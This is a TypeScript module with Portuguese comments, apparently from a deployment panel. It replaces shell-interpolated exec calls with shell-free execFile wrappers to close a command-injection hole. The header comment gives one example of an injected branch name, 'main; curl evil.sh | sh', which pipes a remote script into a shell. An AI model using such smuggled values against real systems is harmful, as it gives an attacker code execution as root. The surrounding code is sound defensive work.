/**
 * Execução de comandos **sem shell**.
 *
 * ## Por que isto existe
 *
 * O painel montava praticamente todo comando por interpolação de template string e
 * entregava para `exec`, que roda tudo através de `/bin/sh`:
 *
 *     execAsync(`git clone --depth 1 --branch ${app.branch} ${app.repository} ${dir}`)
 *     execAsync(`pm2 delete ${app.name}`)
 *     execAsync(`rm -rf ${appDir}`)
 *
 * Um `branch` chamado `main; curl evil.sh | sh` vira dois comandos. Como o backend roda
 * como root, qualquer valor que chegue a uma dessas strings é execução arbitrária no
 * servidor inteiro.
 *
 * `execFile` não usa shell: o primeiro argumento é o executável e o resto é um vetor de
 * argumentos entregue direto ao `execve`. Não existe metacaractere, não existe glob, não
 * existe `;`, `&&`, `|` ou `$()`. Um argumento é sempre um argumento.
 *
 * ## O que continua no shell, de propósito
 *
 * Os comandos que o usuário digita no painel (install/build/migrate/start) continuam
 * passando por shell via `DeployService.runCommand`, porque a capacidade de escrever
 * `pnpm build && pnpm prisma generate` é a funcionalidade. O que muda é que o resto —
 * git, pm2, nginx, rm, cp, certbot — deixa de ser uma superfície de injeção.
 */

import { exec, execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);
const execAsync = promisify(exec);

export interface RunOptions {
  cwd?: string;
  env?: NodeJS.ProcessEnv;
  /** Limite de tempo em ms. Default: 10 minutos (um `git clone` grande é lento). */
  timeout?: number;
  /** Limite do buffer de saída. Default: 16 MB (um `pm2 jlist` com 21 apps é grande). */
  maxBuffer?: number;
}

export interface RunResult {
  stdout: string;
  stderr: string;
}

const DEFAULT_TIMEOUT = 10 * 60 * 1000;
const DEFAULT_MAX_BUFFER = 16 * 1024 * 1024;

/**
 * Executa `file` com `args` sem shell. Rejeita quando o processo sai com código != 0.
 */
export async function run(file: string, args: string[], options: RunOptions = {}): Promise<RunResult> {
  const { stdout, stderr } = await execFileAsync(file, args, {
    cwd: options.cwd,
    env: options.env,
    timeout: options.timeout ?? DEFAULT_TIMEOUT,
    maxBuffer: options.maxBuffer ?? DEFAULT_MAX_BUFFER,
    encoding: 'utf8',
  });

  return { stdout: String(stdout), stderr: String(stderr) };
}

/**
 * Igual a `run`, mas nunca rejeita: devolve `null` em caso de erro.
 *
 * Para limpeza best-effort — `pm2 delete` de um processo que não existe, `rm` de um
 * arquivo já removido — onde o antigo `.catch(() => undefined)` era a intenção.
 */
export async function runQuiet(
  file: string,
  args: string[],
  options: RunOptions = {},
): Promise<RunResult | null> {
  try {
    return await run(file, args, options);
  } catch {
    return null;
  }
}

/**
 * Executa `file` com privilégio via `sudo`, sem shell.
 *
 * `sudo` recebe o executável e os argumentos como argv, então o mesmo raciocínio vale:
 * nada do que vem depois é reinterpretado.
 */
export function sudo(file: string, args: string[], options: RunOptions = {}): Promise<RunResult> {
  return run('sudo', [file, ...args], options);
}

/** Versão best-effort de `sudo`. */
export function sudoQuiet(
  file: string,
  args: string[],
  options: RunOptions = {},
): Promise<RunResult | null> {
  return runQuiet('sudo', [file, ...args], options);
}

/**
 * Captura stdout **e** stderr mesmo quando o comando falha.
 *
 * Substitui o padrão `cmd 2>&1 || true` que existia nas chamadas de log do PM2: ali o
 * que interessa é o texto produzido, não o código de saída.
 */
export async function runCapture(
  file: string,
  args: string[],
  options: RunOptions = {},
): Promise<string> {
  try {
    const { stdout, stderr } = await run(file, args, options);
    return `${stdout}${stderr}`;
  } catch (error: any) {
    return `${error?.stdout ?? ''}${error?.stderr ?? ''}`;
  }
}

/**
 * Executa uma string de comando **através do shell**.
 *
 * Uso restrito e intencional, em dois lugares:
 *
 *   1. Os comandos que o usuário digita no painel (install/build/migrate/start).
 *      Poder escrever `pnpm build && pnpm prisma generate` é a funcionalidade.
 *   2. As strings montadas por `deploy/docker.ts`, que já passam todo argumento por
 *      `shq()` (aspas simples com escape) e têm testes cobrindo justamente isso.
 *
 * Para qualquer outra coisa use `run`/`sudo`: se o comando é montado com um valor que
 * veio do banco ou de uma requisição, ele não pertence aqui.
 */
export async function runShell(command: string, options: RunOptions = {}): Promise<RunResult> {
  const { stdout, stderr } = await execAsync(command, {
    cwd: options.cwd,
    env: options.env,
    timeout: options.timeout ?? DEFAULT_TIMEOUT,
    maxBuffer: options.maxBuffer ?? DEFAULT_MAX_BUFFER,
    encoding: 'utf8',
  });
  return { stdout: String(stdout), stderr: String(stderr) };
}
